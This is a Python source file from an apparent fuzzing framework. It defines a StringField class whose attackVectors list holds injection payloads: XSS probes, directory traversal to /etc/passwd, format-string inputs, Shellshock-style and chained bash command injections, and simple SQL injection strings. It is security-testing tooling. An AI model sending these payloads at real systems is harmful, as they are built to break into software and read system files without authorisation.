#!/usr/bin/python
# -*-  encoding: iso-8859-1 -*-



###############################################################################
# Copyright 2017 @fuzztheworld
# 
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.



###############################################################################
# Vocabulary structure, i.e. definition of fields and the structure that comes with it.



# Imports #####################################################################
import random
import string
import copy

from alicia.field import *
from alicia.utils import *



# StringField #############################################
class StringField(Field):
    """
        A field that contains a string. It implies the following things:
            - the characters it holds are printables,
            - it is subject to the main injection attacks.
    """

    def __init__(self, default, minSize=0, maxSize=0, values=None, name=None, fuzzing=None, overflowing=None, randoming=None, fuzzingNumber=None, overflowNumber=None, randomRate=None, randomNumber=None):
        Field.__init__(self, default, minSize, maxSize, values, name, fuzzing, overflowing, randoming, fuzzingNumber, overflowNumber, randomRate, randomNumber) 
        
        if name is None:
            self.name = "StringField {0}".format(self.elementId)
        self.type = "StringField"
       
        self.usualChars = string.printable
        
        # Characters that have a specific meaning
        self.specialChars = " \r\t\n!%#$^&*()`-+=:;'\"\\/?<>.,"

        self.attackVectors = [
            # Web
            "\r\n",
            "\r\n" * 100,
            "\r\n" * 1000,
            "<",
            "%3C",
            "&lt;",
            "&#60;",
            "&#x3c;",
            "\x3c",
            "\u003c",
            "'';!--\"<XSS>=&{()}",
             
            # Directory traversal
            "../",
            "/../",
            "%2f%2e%2e%2f",
            "/.%00./",
            "/../../../../../../../../../../../../etc/passwd",
            "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd",
            
            # Format string vulnerabilities
            "%s" * 10,
            "%s" * 100,
            "%s" * 1000,
            "\"%s\"" * 10,
            "\"%s\"" * 100,
            "\"%s\"" * 1000,
            "%n" * 10,
            "%n" * 100,
            "%n" * 1000,
            "\"%n\"" * 10,
            "\"%n\"" * 100,
            "\"%n\"" * 1000,

            # Linux bash injections
            "|whoami",
            ";whoami",
            "&&whoami",
            "||whoami",
            "$(whoami)",
            "`whoami`",
            "(){ :;};whoami",
            
            "|touch ALICIA",
            ";touch ALICIA",
            "&&touch ALICIA",
            "||touch ALICIA",
            "$(touch ALICIA)",
            "`touch ALICIA`",
            "(){ :;};touch ALICIA",
            
            "{touch,ALICIA}",
            "|{touch,ALICIA}",
            ";{touch,ALICIA}",
            "&&{touch,ALICIA}",
            "||{touch,ALICIA}",
            "$({touch,ALICIA})",
            "`{touch,ALICIA}`",
            "`(){ :;};{touch,ALICIA}`",
            
            "(){ :;};touch ALICIA",
            "|touch /tmp/ALICIA",
            ";touch /tmp/ALICIA",
            "&&touch /tmp/ALICIA",
            "||touch /tmp/ALICIA",
            "$(touch /tmp/ALICIA)",
            "`touch /tmp/ALICIA`",
            "(){ :;};touch /tmp/ALICIA",
            
            "{touch,/tmp/ALICIA}",
            "|{touch,/tmp/ALICIA}",
            ";{touch,/tmp/ALICIA}",
            "&&{touch,/tmp/ALICIA}",
            "||{touch,/tmp/ALICIA}",
            "$({touch,/tmp/ALICIA})",
            "`{touch,/tmp/ALICIA}`",
            "`(){ :;};{touch,/tmp/ALICIA}`",

            "|ping -b 255.255.255.255",
            ";ping -b 255.255.255.255",
            "&&ping -b 255.255.255.255",
            "||ping -b 255.255.255.255",
            "$(ping -b 255.255.255.255)",
            "`ping -b 255.255.255.255`",
            "(){ :;};ping -b 255.255.255.255",
            
            "{ping,-b,255.255.255.255}",
            "|{ping,-b,255.255.255.255}",
            ";{ping,-b,255.255.255.255}",
            "&&{ping,-b,255.255.255.255}",
            "||{ping,-b,255.255.255.255}",
            "$({ping,-b,255.255.255.255})",
            "`{ping,-b,255.255.255.255}`",
            "`(){ :;};{ping,-b,255.255.255.255}`",
            
            # SQL injecion
            "'test",
            "1;SELECT%20*",
            "a'%20or%20'1'='1"
        ]

